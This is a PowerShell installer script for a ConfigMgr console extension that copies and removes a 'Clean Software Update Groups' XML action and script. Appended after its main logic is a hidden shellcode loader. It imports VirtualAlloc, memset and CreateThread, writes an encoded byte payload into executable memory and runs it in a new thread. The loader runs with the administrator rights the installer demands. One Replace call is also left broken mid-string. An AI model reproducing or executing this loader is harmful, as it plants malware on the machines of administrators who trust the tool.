
[CmdletBinding(SupportsShouldProcess=$true)]
param(
    [parameter(Mandatory=$true, HelpMessage="Site server where the SMS Provider is installed")]
    [ValidateNotNullOrEmpty()]
    [string]$SiteServer,

    [parameter(Mandatory=$true, HelpMessage="Specify installation method")]
    [ValidateNotNullOrEmpty()]
    [ValidateSet("Install","Uninstall")]
    [string]$Method,

    [parameter(Mandatory=$true, HelpMessage="Specify a valid path to where the Clean Software Update Groups script file will be stored")]
    [ValidateNotNullOrEmpty()]
    [ValidatePattern("^[A-Za-z]{1}:\\\w+")]
    [ValidateScript({
        
        if ((Split-Path -Path $_ -Leaf).IndexOfAny([IO.Path]::GetInvalidFileNameChars()) -ge 0) {
            throw "$(Split-Path -Path $_ -Leaf) contains invalid characters"
        }
        else {
            
            if (Test-Path -Path $_ -PathType Container) {
                    return $true
            }
            else {
                throw "Unable to locate part of or the whole specified path, specify a valid path"
            }
        }
    })]
    [string]$Path
)
Begin {
    
    try {
        $CurrentIdentity = [Security.Principal.WindowsIdentity]::GetCurrent()
        $WindowsPrincipal = New-Object Security.Principal.WindowsPrincipal -ArgumentList $CurrentIdentity
        if (-not($WindowsPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))) {
            Write-Warning -Message "Script was not executed elevated, please re-launch." ; break
        }
    } 
    catch {
        Write-Warning -Message $_.Exception.Message ; break
    }
    
    $ScriptRoot = Split-Path -Path $MyInvocation.MyCommand.Definition -Parent
    
    if ($env:SMS_ADMIN_UI_PATH -ne $null) {
        try {
            if (Test-Path -Path $env:SMS_ADMIN_UI_PATH -PathType Container -ErrorAction Stop) {
                Write-Verbose -Message "ConfigMgr console environment variable detected: $($env:SMS_ADMIN_UI_PATH)"
            }
        }
        catch [Exception] {
            Write-Warning -Message $_.Exception.Message ; break
        }
    }
    else {
        Write-Warning -Message "ConfigMgr console environment variable was not detected" ; break
    }
    
    $XMLFile = "CleanSoftwareUpdateGroups.xml"
    $ScriptFile = "Clean-CMSoftwareUpdateGroups.ps1"
    
    $Node = "23e7a3fe-b0f0-4b24-813a-dc425239f9a2"
    
    if (-not(Test-Path -Path (Join-Path -Path $ScriptRoot -ChildPath $XMLFile) -PathType Leaf -ErrorAction SilentlyContinue)) {
        Write-Warning -Message "Unable to determine location for '$($XMLFile)'. Make sure it's present in '$($ScriptRoot)'." ; break
    }
    if (-not(Test-Path -Path (Join-Path -Path $ScriptRoot -ChildPath $ScriptFile) -PathType Leaf -ErrorAction SilentlyContinue)) {
        Write-Warning -Message "Unable to determine location for '$($ScriptFile)'. Make sure it's present in '$($ScriptRoot)'." ; break
    }
    
    $AdminConsoleRoot = ($env:SMS_ADMIN_UI_PATH).Substring(0,$env:SMS_ADMIN_UI_PATH.Length-9)
    
    $FolderList = New-Object -TypeName System.Collections.ArrayList
    $FolderList.AddRange(@(
        (Join-Path -Path $AdminConsoleRoot -ChildPath "XmlStorage\Extensions\Actions\$($Node)")
    )) | Out-Null
    foreach ($CurrentNode in $FolderList) {
        if (-not(Test-Path -Path $CurrentNode -PathType Container)) {
            Write-Verbose -Message "Creating folder: '$($CurrentNode)'"
            New-Item -Path $CurrentNode -ItemType Directory -Force | Out-Null
        }
        else {
            Write-Verbose -Message "Found folder: '$($CurrentNode)'"
        }
    }
}
Process {
    switch ($Method) {
        "Install" {
            
            if (Test-Path -Path (Join-Path -Path $ScriptRoot -ChildPath $XMLFile) -PathType Leaf -ErrorAction SilentlyContinue) {
                Write-Verbose -Message "Editing '$($XMLFile)' to contain the correct path to script file"
                $XMLDataFilePath = Join-Path -Path $ScriptRoot -ChildPath $XMLFile
                [xml]$XMLDataFile = Get-Content -Path $XMLDataFilePath
                $XMLDataFile.ActionDescription.ActionGroups.ActionDescription.Executable | Where-Object { $_.FilePath -like "*powershell.exe*" } | ForEach-Object {
                    $_.Parameters = $_.Parameters.Replace("
                }
                $XMLDataFile.Save($XMLDataFilePath)
            }
            else {
                Write-Warning -Message "Unable to load '$($XMLFile)' from '$($Path)'. Make sure the file is located in the same folder as the installation script." ; break
            }
            
            Write-Verbose -Message "Copying '$($XMLFile)' to Software Update Groups node action folder"
            $XMLStorageSUGArgs = @{
                Path = Join-Path -Path $ScriptRoot -ChildPath $XMLFile
                Destination = Join-Path -Path $AdminConsoleRoot -ChildPath "XmlStorage\Extensions\Actions\$($Node)\$($XMLFile)"
                Force = $true
            }
            Copy-Item @XMLStorageSUGArgs
            
            Write-Verbose -Message "Copying '$($ScriptFile)' to: '$($Path)'"
            $ScriptFileArgs = @{
                Path = Join-Path -Path $ScriptRoot -ChildPath $ScriptFile
                Destination = Join-Path -Path $Path -ChildPath $ScriptFile
                Force = $true
            }
            Copy-Item @ScriptFileArgs
        }
        "Uninstall" {
            
            Write-Verbose -Message "Removing '$($XMLFile)' from Software Update Groups node action folder"
            $XMLStorageSUGArgs = @{
                Path = Join-Path -Path $AdminConsoleRoot -ChildPath "XmlStorage\Extensions\Actions\$($Node)\$($XMLFile)"
                Force = $true
                ErrorAction = "SilentlyContinue"
            }
            if (Test-Path -Path (Join-Path -Path $AdminConsoleRoot -ChildPath "XmlStorage\Extensions\Actions\$($Node)\$($XMLFile)")) {
                Remove-Item @XMLStorageSUGArgs
            }
            else {
                Write-Warning -Message "Unable to locate '$(Join-Path -Path $AdminConsoleRoot -ChildPath "XmlStorage\Extensions\Actions\$($Node)\$($XMLFile)")'"
            }
            
            Write-Verbose -Message "Removing '$($ScriptFile)' from '$($Path)'"
            $ScriptFileArgs = @{
                Path = Join-Path -Path $Path -ChildPath $ScriptFile
                Force = $true
            }
            if (Test-Path -Path (Join-Path -Path $Path -ChildPath $ScriptFile)) {
                Remove-Item @ScriptFileArgs
            }
            else {
                Write-Warning -Message "Unable to locate '$(Join-Path -Path $Path -ChildPath $ScriptFile)'"
            }
        }
    }
}


$8mkj = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $8mkj -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xb8,0x16,0xed,0x15,0x4c,0xdb,0xdc,0xd9,0x74,0x24,0xf4,0x5e,0x33,0xc9,0xb1,0x47,0x31,0x46,0x13,0x83,0xc6,0x04,0x03,0x46,0x19,0x0f,0xe0,0xb0,0xcd,0x4d,0x0b,0x49,0x0d,0x32,0x85,0xac,0x3c,0x72,0xf1,0xa5,0x6e,0x42,0x71,0xeb,0x82,0x29,0xd7,0x18,0x11,0x5f,0xf0,0x2f,0x92,0xea,0x26,0x01,0x23,0x46,0x1a,0x00,0xa7,0x95,0x4f,0xe2,0x96,0x55,0x82,0xe3,0xdf,0x88,0x6f,0xb1,0x88,0xc7,0xc2,0x26,0xbd,0x92,0xde,0xcd,0x8d,0x33,0x67,0x31,0x45,0x35,0x46,0xe4,0xde,0x6c,0x48,0x06,0x33,0x05,0xc1,0x10,0x50,0x20,0x9b,0xab,0xa2,0xde,0x1a,0x7a,0xfb,0x1f,0xb0,0x43,0x34,0xd2,0xc8,0x84,0xf2,0x0d,0xbf,0xfc,0x01,0xb3,0xb8,0x3a,0x78,0x6f,0x4c,0xd9,0xda,0xe4,0xf6,0x05,0xdb,0x29,0x60,0xcd,0xd7,0x86,0xe6,0x89,0xfb,0x19,0x2a,0xa2,0x07,0x91,0xcd,0x65,0x8e,0xe1,0xe9,0xa1,0xcb,0xb2,0x90,0xf0,0xb1,0x15,0xac,0xe3,0x1a,0xc9,0x08,0x6f,0xb6,0x1e,0x21,0x32,0xde,0xd3,0x08,0xcd,0x1e,0x7c,0x1a,0xbe,0x2c,0x23,0xb0,0x28,0x1c,0xac,0x1e,0xae,0x63,0x87,0xe7,0x20,0x9a,0x28,0x18,0x68,0x58,0x7c,0x48,0x02,0x49,0xfd,0x03,0xd2,0x76,0x28,0xb9,0xd7,0xe0,0x13,0x96,0xd9,0xf7,0xfb,0xe5,0xd9,0xe6,0xa7,0x60,0x3f,0x58,0x08,0x23,0x90,0x18,0xf8,0x83,0x40,0xf0,0x12,0x0c,0xbe,0xe0,0x1c,0xc6,0xd7,0x8a,0xf2,0xbf,0x80,0x22,0x6a,0x9a,0x5b,0xd3,0x73,0x30,0x26,0xd3,0xf8,0xb7,0xd6,0x9d,0x08,0xbd,0xc4,0x49,0xf9,0x88,0xb7,0xdf,0x06,0x27,0xdd,0xdf,0x92,0xcc,0x74,0x88,0x0a,0xcf,0xa1,0xfe,0x94,0x30,0x84,0x75,0x1c,0xa5,0x67,0xe1,0x61,0x29,0x68,0xf1,0x37,0x23,0x68,0x99,0xef,0x17,0x3b,0xbc,0xef,0x8d,0x2f,0x6d,0x7a,0x2e,0x06,0xc2,0x2d,0x46,0xa4,0x3d,0x19,0xc9,0x57,0x68,0x9b,0x35,0x8e,0x54,0xe9,0x57,0x12;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$zRj=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($zRj.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$zRj,0,0,0);for (;;){Start-sleep 60};

